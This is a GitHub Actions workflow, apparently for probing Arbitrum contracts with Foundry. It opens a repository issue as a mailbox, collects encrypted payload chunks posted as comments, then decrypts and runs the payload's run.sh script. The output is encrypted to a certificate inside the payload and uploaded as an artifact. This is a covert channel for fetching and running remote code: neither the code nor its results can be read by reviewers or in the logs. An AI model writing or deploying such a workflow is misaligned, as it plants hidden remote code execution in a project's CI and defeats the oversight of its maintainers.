name: Private encrypted Foundry probe

on:
  pull_request:
    branches: [main]

permissions:
  contents: read
  issues: write

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1
        with:
          version: stable

      - name: Checkout pinned Arbitrum contracts
        uses: actions/checkout@v4
        with:
          repository: OffchainLabs/nitro-contracts
          ref: 67487333202561b74492d07de62a4f56be28560e
          path: nitro-contracts
          fetch-depth: 1
          submodules: recursive

      - name: Generate one-time mailbox key
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p /tmp/probe
          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 \
            -out /tmp/probe/private.pem >/dev/null 2>&1
          openssl req -new -x509 -key /tmp/probe/private.pem \
            -out /tmp/probe/cert.pem -subj '/CN=one-time-probe' -days 1
          openssl rand -hex 12 > /tmp/probe/token

      - name: Publish exact mailbox certificate artifact
        uses: actions/upload-artifact@v4
        with:
          name: mailbox-cert-${{ github.run_id }}
          path: /tmp/probe/cert.pem
          retention-days: 1
          if-no-files-found: error

      - name: Create encrypted mailbox issue
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          TOKEN="$(cat /tmp/probe/token)"
          ARTIFACT="mailbox-cert-$GITHUB_RUN_ID"
          python3 - "$GITHUB_RUN_ID" "$TOKEN" "$ARTIFACT" <<'PY' > /tmp/probe/create.json
          import json, sys
          run_id, token, artifact = sys.argv[1:]
          print(json.dumps({
              'title': 'mailbox-' + run_id,
              'body': 'TOKEN:' + token + '\nCERT_ARTIFACT:' + artifact,
          }))
          PY
          curl -fsSL -X POST \
            -H "Authorization: Bearer $GH_TOKEN" \
            -H 'Accept: application/vnd.github+json' \
            -H 'Content-Type: application/json' \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/issues" \
            --data-binary @/tmp/probe/create.json > /tmp/probe/issue.json
          python3 - <<'PY' > /tmp/probe/issue_number
          import json
          with open('/tmp/probe/issue.json', encoding='utf-8') as f:
              print(json.load(f)['number'])
          PY

      - name: Receive and execute encrypted payload
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          ISSUE_NUMBER="$(cat /tmp/probe/issue_number)"

          for _ in $(seq 1 360); do
            curl -fsSL \
              -H "Authorization: Bearer $GH_TOKEN" \
              -H 'Accept: application/vnd.github+json' \
              "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$ISSUE_NUMBER" \
              > /tmp/probe/current.json
            curl -fsSL \
              -H "Authorization: Bearer $GH_TOKEN" \
              -H 'Accept: application/vnd.github+json' \
              "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$ISSUE_NUMBER/comments?per_page=100" \
              > /tmp/probe/comments.json

            python3 - <<'PY'
          import json, re
          from pathlib import Path

          issue = json.loads(Path('/tmp/probe/current.json').read_text())
          comments = json.loads(Path('/tmp/probe/comments.json').read_text())
          body = issue.get('body') or ''
          count_match = re.search(r'^PAYLOAD_CHUNKS:(\d+)$', body, re.M)
          hash_match = re.search(r'^PAYLOAD_SHA256:([0-9a-f]{64})$', body, re.M)
          if not count_match or not hash_match:
              raise SystemExit(0)

          count = int(count_match.group(1))
          chunks = {}
          for comment in comments:
              text = (comment.get('body') or '').strip()
              match = re.fullmatch(r'PAYLOAD_CHUNK:(\d{4}):([A-Za-z0-9+/=]+)', text)
              if match:
                  chunks[int(match.group(1))] = match.group(2)
          if set(chunks) != set(range(count)):
              raise SystemExit(0)

          Path('/tmp/probe/payload.b64').write_text(''.join(chunks[i] for i in range(count)))
          Path('/tmp/probe/expected_sha256').write_text(hash_match.group(1))
          Path('/tmp/probe/payload.ready').write_text('ready')
          PY
            if [ -f /tmp/probe/payload.ready ]; then
              break
            fi
            sleep 5
          done

          test -f /tmp/probe/payload.ready
          base64 -d /tmp/probe/payload.b64 > /tmp/probe/payload.cms
          EXPECTED="$(cat /tmp/probe/expected_sha256)"
          ACTUAL="$(sha256sum /tmp/probe/payload.cms | awk '{print $1}')"
          test "$ACTUAL" = "$EXPECTED"

          openssl cms -decrypt -binary -inform DER \
            -in /tmp/probe/payload.cms \
            -inkey /tmp/probe/private.pem \
            -recip /tmp/probe/cert.pem \
            -out /tmp/probe/payload.tar.gz
          mkdir -p /tmp/probe/payload
          tar -xzf /tmp/probe/payload.tar.gz -C /tmp/probe/payload
          test -f /tmp/probe/payload/run.sh
          test -f /tmp/probe/payload/return_cert.pem
          chmod 700 /tmp/probe/payload/run.sh

          set +e
          /tmp/probe/payload/run.sh > /tmp/probe/test.log 2>&1
          STATUS=$?
          set -e

          {
            printf 'exit_status=%s\n' "$STATUS"
            cat /tmp/probe/test.log
          } > /tmp/probe/result.txt
          openssl cms -encrypt -binary -aes-256-cbc -outform DER \
            -in /tmp/probe/result.txt \
            -out /tmp/probe/result.cms \
            /tmp/probe/payload/return_cert.pem
          printf '%s\n' "$STATUS" > /tmp/probe/status

          RESULT_ARTIFACT="probe-result-$GITHUB_RUN_ID"
          python3 - "$RESULT_ARTIFACT" "$STATUS" <<'PY' > /tmp/probe/update.json
          import json, sys
          artifact, status = sys.argv[1:]
          print(json.dumps({
              'body': 'RESULT_ARTIFACT:' + artifact + '\nSTATUS:' + status,
              'state': 'closed',
          }))
          PY
          curl -fsSL -X PATCH \
            -H "Authorization: Bearer $GH_TOKEN" \
            -H 'Accept: application/vnd.github+json' \
            -H 'Content-Type: application/json' \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$ISSUE_NUMBER" \
            --data-binary @/tmp/probe/update.json >/dev/null

          exit "$STATUS"

      - name: Publish exact encrypted result artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: probe-result-${{ github.run_id }}
          path: |
            /tmp/probe/result.cms
            /tmp/probe/status
          retention-days: 1
          if-no-files-found: warn
